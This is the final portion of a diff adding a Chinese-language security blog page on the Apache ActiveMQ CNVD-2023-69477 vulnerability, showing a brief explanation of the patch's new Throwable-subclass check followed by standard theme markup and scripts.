+<p>新版本<code>BaseDataStreamMarshaller#createThrowable</code>增加了一处判断</p>
+<p><img src="/./../img/image-20231115225326540.png" srcset="/img/loading.gif" lazyload alt="image-20231115225326540"></p>
+<p><code>OpenWireUtil#validateIsThrowable</code>判断类是否为<code>Throwable</code>的子类，否则抛出异常</p>
+<p><img src="/./../img/image-20231115225456750.png" srcset="/img/loading.gif" lazyload alt="image-20231115225456750"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+        <a href="/tags/java/" class="print-no-link">#java</a>
+      
+        <a href="/tags/middleware/" class="print-no-link">#middleware</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Apache ActiveMQ CNVD-2023-69477</div>
+      <div>http://example.com/2023/11/06/activemq/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/10/kafka/" title="Spring-Kafka CVE-2023-34040">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Spring-Kafka CVE-2023-34040</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/24/mysql-master-slave/" title="mysql主从复制绕WAF">
+                        <span class="hidden-mobile">mysql主从复制绕WAF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
